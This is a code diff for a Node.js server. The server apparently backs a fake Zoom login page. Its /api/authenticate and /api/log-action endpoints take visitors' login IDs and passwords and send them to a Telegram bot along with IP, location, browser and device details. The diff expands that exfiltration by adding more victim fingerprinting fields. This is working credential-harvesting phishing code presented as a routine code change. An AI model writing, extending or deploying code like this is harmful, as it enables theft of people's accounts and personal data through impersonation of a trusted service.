@@ -120,21 +120,34 @@ async function sendTelegramAlert(message) {
 
 app.post('/api/log-action', async (req, res) => {
   try {
-    const { action, email, password, intruderDetected } = req.body;
+    const { action, email, password, intruderDetected, attempts, visitorInfo } = req.body;
     const ip = getClientIp(req);
     const location = await getLocationFromIp(ip);
     const ua = req.headers['user-agent'];
 
     console.log(`[ACTION] ${action} | IP: ${ip} | Email: ${email || 'none'}`);
 
-    const tgText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
+    let tgText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
 Login ID: ${email || 'none'}
 Password: ${password || 'N/A'}
 Browser: ${ua}
 Location: ${location}
 IP: ${ip}
-Time: ${new Date().toISOString()}
-${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}`;
+Time: ${new Date().toISOString()}`;
+    
+    // Add visitor info details
+    if (visitorInfo) {
+      tgText += `\n\n--- Visitor Info ---`;
+      if (visitorInfo.fullUrl) tgText += `\nURL: ${visitorInfo.fullUrl}`;
+      if (visitorInfo.referrer) tgText += `\nReferrer: ${visitorInfo.referrer}`;
+      if (visitorInfo.platform) tgText += `\nPlatform: ${visitorInfo.platform}`;
+      if (visitorInfo.language) tgText += `\nLanguage: ${visitorInfo.language}`;
+      if (visitorInfo.timezone) tgText += `\nTimezone: ${visitorInfo.timezone}`;
+      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
+      if (visitorInfo.colorDepth) tgText += `\nColor Depth: ${visitorInfo.colorDepth}-bit`;
+    }
+    
+    if (intruderDetected) tgText += `\n\n🚨 INTRUDER DETECTED!`;
     
     sendTelegramAlert(tgText);
 
@@ -147,18 +160,32 @@ ${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}`;
 
 app.post('/api/authenticate', async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, visitorInfo } = req.body;
     const ip = getClientIp(req);
     const location = await getLocationFromIp(ip);
+    const ua = req.headers['user-agent'];
 
     console.log(`[LOGIN] Attempt for: ${email} | IP: ${ip}`);
 
-    const tgText = `🔐 New Zoom Login Attempt
+    let tgText = `🔐 New Zoom Login Attempt
 Login ID: ${email}
 Password: ${password}
+Browser: ${ua}
 Location: ${location}
 IP: ${ip}
 Time: ${new Date().toISOString()}`;
+    
+    // Add visitor info details
+    if (visitorInfo) {
+      tgText += `\n\n--- Visitor Info ---`;
+      if (visitorInfo.fullUrl) tgText += `\nURL: ${visitorInfo.fullUrl}`;
+      if (visitorInfo.referrer) tgText += `\nReferrer: ${visitorInfo.referrer}`;
+      if (visitorInfo.platform) tgText += `\nPlatform: ${visitorInfo.platform}`;
+      if (visitorInfo.language) tgText += `\nLanguage: ${visitorInfo.language}`;
+      if (visitorInfo.timezone) tgText += `\nTimezone: ${visitorInfo.timezone}`;
+      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
+      if (visitorInfo.colorDepth) tgText += `\nColor Depth: ${visitorInfo.colorDepth}-bit`;
+    }
     
     sendTelegramAlert(tgText);
 
